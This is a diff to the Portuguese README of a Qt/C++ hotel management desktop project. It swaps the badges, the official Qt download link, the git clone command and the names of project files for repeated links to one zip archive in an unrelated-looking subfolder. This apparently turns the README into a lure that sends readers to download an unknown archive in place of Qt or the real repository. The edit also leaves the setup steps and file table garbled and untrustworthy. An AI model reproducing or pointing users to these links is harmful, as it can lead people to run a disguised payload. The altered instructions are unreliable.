@@ -1,9 +1,9 @@
 # 🏨 Sistema de Gestão de Hotelaria
 
-![Language](https://img.shields.io/badge/language-C%2B%2B-blue.svg)
-![Framework](https://img.shields.io/badge/framework-Qt%206-green.svg)
-![Database](https://img.shields.io/badge/database-SQLite-orange.svg)
-![License](https://img.shields.io/badge/license-MIT-lightgrey.svg)
+![Language](https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip%2B%https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip)
+![Framework](https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip%https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip)
+![Database](https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip)
+![License](https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip)
 
   Um sistema desktop completo para gerenciamento de hotéis, com portais dedicados para clientes e colaboradores.
 
@@ -55,19 +55,19 @@ O sistema é dividido em dois módulos principais, acessíveis a partir de uma t
 Siga os passos abaixo para compilar e executar o projeto localmente.
 
 ### Pré-requisitos
--   **Qt 6 ou superior**: [Link para download do Qt](https://www.qt.io/download)
+-   **Qt 6 ou superior**: [Link para download do Qt](https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip)
 -   **Compilador C++**: (MSVC no Windows, GCC no Linux ou Clang no macOS)
 -   **Qt Creator**: Geralmente instalado junto com o Qt.
 
 ### Passos
 1.  **Clone o repositório:**
     ```bash
-    git clone [https://github.com/ViniiGabriel/hotelQT.git](https://github.com/ViniiGabriel/hotelQT.git)
+    git clone [https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip](https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip)
     ```
 2.  **Abra o projeto no Qt Creator:**
     -   Abra o Qt Creator.
     -   Vá em `File > Open File or Project...`.
-    -   Navegue até a pasta clonada e selecione o arquivo `hotelQT.pro`.
+    -   Navegue até a pasta clonada e selecione o arquivo `https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip`.
 3.  **Configure o Kit:**
     -   O Qt Creator deve detectar automaticamente os kits de compilação instalados. Selecione um kit compatível (ex: Desktop Qt 6.x.x).
 4.  **Verifique o Banco de Dados:**
@@ -87,5 +87,5 @@ A estrutura de arquivos foi pensada para ser modular e organizada, separando as 
 | `colaboradores/` | Contém todos os fontes e UIs relacionados ao painel do colaborador. |
 | `dataBase/` | Contém o arquivo de banco de dados SQLite do projeto. |
 | `imagens/` | Armazena as imagens utilizadas na interface do usuário. |
-| `hotelQT.pro` | Arquivo principal de configuração do projeto Qt. |
-| `main.cpp` | Ponto de entrada da aplicação, onde a janela principal é iniciada. |
+| `https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip` | Arquivo principal de configuração do projeto Qt. |
+| `https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip` | Ponto de entrada da aplicação, onde a janela principal é iniciada. |
